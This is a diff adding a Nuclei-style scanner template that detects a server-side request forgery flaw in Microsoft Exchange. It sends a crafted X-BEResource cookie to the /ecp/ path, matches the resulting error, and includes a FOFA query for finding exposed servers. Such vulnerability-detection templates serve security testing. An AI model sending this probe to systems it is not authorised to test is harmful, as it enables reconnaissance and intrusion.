@@ -1,0 +1,27 @@
+id: ms-exchange-ssrf
+
+info:
+  name: MS Exchange SSRF
+  author: zp857
+  severity: medium
+  tags: miscrsoft,exchange,owa,ms-exchange
+  metadata:
+    fofa-query: 'icon_hash="1768726119"'
+
+requests:
+  - raw:
+      - |
+        GET /ecp/zp857.js HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: X-BEResource=zp857/api/endpoint#~1; X-AnonResource=true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "NegotiateSecurityContext failed with"
+        condition: and
+
+      - type: status
+        status:
+          - 500
